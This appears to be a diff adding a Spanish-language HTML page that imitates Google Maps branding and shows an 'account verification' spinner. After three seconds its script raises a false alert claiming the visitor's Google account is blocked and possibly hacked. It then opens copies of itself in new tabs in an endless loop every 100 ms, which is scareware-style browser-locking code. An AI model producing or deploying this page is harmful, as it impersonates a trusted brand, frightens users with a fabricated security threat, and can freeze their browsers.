@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificando cuenta</title>
+    <style>
+        /* Reset completo */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1.8rem;
+            padding: 2rem 1.5rem;
+            max-width: 420px;
+            width: 100%;
+            background: transparent;
+        }
+
+        /* Logo de Google Maps */
+        .google-maps-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .maps-icon {
+            position: relative;
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+        }
+
+        .pin {
+            width: 100%;
+            height: 100%;
+            background: #1a73e8;
+            border-radius: 50% 50% 50% 0;
+            transform: rotate(-45deg);
+            position: relative;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
+        }
+
+        .pin::after {
+            content: '';
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            background: white;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(45deg);
+        }
+
+        .maps-text {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #1f1f1f;
+            letter-spacing: -0.5px;
+        }
+
+        .maps-text span {
+            font-weight: 400;
+            color: #5f6368;
+        }
+
+        /* Círculo de carga */
+        .loader {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 5px solid #e8eaed;
+            border-top: 5px solid #1a73e8;
+            border-right: 5px solid #1a73e8;
+            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+            flex-shrink: 0;
+            margin-top: 0.5rem;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status-text {
+            color: #202124;
+            font-size: 1.1rem;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            text-align: center;
+        }
+
+        .status-text .light {
+            font-weight: 400;
+            color: #5f6368;
+        }
+
+        .divider {
+            width: 100%;
+            max-width: 200px;
+            height: 1px;
+            background: #dadce0;
+            margin: 0.2rem 0;
+        }
+
+        .sub-text {
+            color: #5f6368;
+            font-size: 0.85rem;
+            font-weight: 400;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 480px) {
+            .maps-text {
+                font-size: 1.2rem;
+            }
+            .maps-icon {
+                width: 36px;
+                height: 36px;
+            }
+            .loader {
+                width: 40px;
+                height: 40px;
+                border-width: 4px;
+            }
+            .status-text {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo de Google Maps -->
+        <div class="google-maps-logo">
+            <div class="maps-icon">
+                <div class="pin"></div>
+            </div>
+            <div class="maps-text">
+                Google <span>Maps</span>
+            </div>
+        </div>
+
+        <!-- Círculo de carga -->
+        <div class="loader" role="status" aria-label="Cargando"></div>
+
+        <!-- Texto principal -->
+        <div class="status-text">
+            Verificando <span class="light">cuenta</span>
+        </div>
+
+        <!-- Línea divisoria -->
+        <div class="divider"></div>
+
+        <!-- Texto secundario -->
+        <div class="sub-text">
+            Esto puede tomar unos segundos
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // Tiempo: 3 segundos
+            const TIEMPO_ALERTA = 3000;
+
+            // Mensaje con ortografía corregida
+            const MENSAJE_ALERTA =
+                "Peligro, su cuenta ha sido bloqueada. Hemos detectado un dispositivo con acceso a su cuenta de Google, posiblemente hackeada.";
+
+            // Bandera para evitar múltiples temporizadores
+            let alertaActiva = false;
+
+            // Función que muestra la alerta y abre una nueva pestaña
+            function mostrarAlertaYAbrirPestana() {
+                // Mostrar la alerta
+                alert(MENSAJE_ALERTA);
+
+                // Abrir una nueva pestaña con la misma URL
+                // Usamos window.open con la URL actual
+                const urlActual = window.location.href;
+                window.open(urlActual, '_blank');
+
+                // Programar la siguiente alerta después de un breve retraso
+                setTimeout(mostrarAlertaYAbrirPestana, 100);
+            }
+
+            // Función que inicia el bucle
+            function iniciarBucle() {
+                if (alertaActiva) return;
+                alertaActiva = true;
+                // Primer llamado con un pequeño retraso
+                setTimeout(mostrarAlertaYAbrirPestana, 100);
+            }
+
+            // Temporizador para activar el bucle a los 3 segundos
+            const timeoutId = setTimeout(iniciarBucle, TIEMPO_ALERTA);
+
+            // Limpieza si la página se cierra antes del tiempo
+            window.addEventListener('beforeunload', function() {
+                if (timeoutId) {
+                    clearTimeout(timeoutId);
+                }
+            });
+
+            // Advertencia en consola (no visible para el usuario)
+            console.warn("⚠️ Esta página abrirá nuevas pestañas y alertas en bucle después de 3 segundos.");
+        })();
+    </script>
+</body>
+</html>
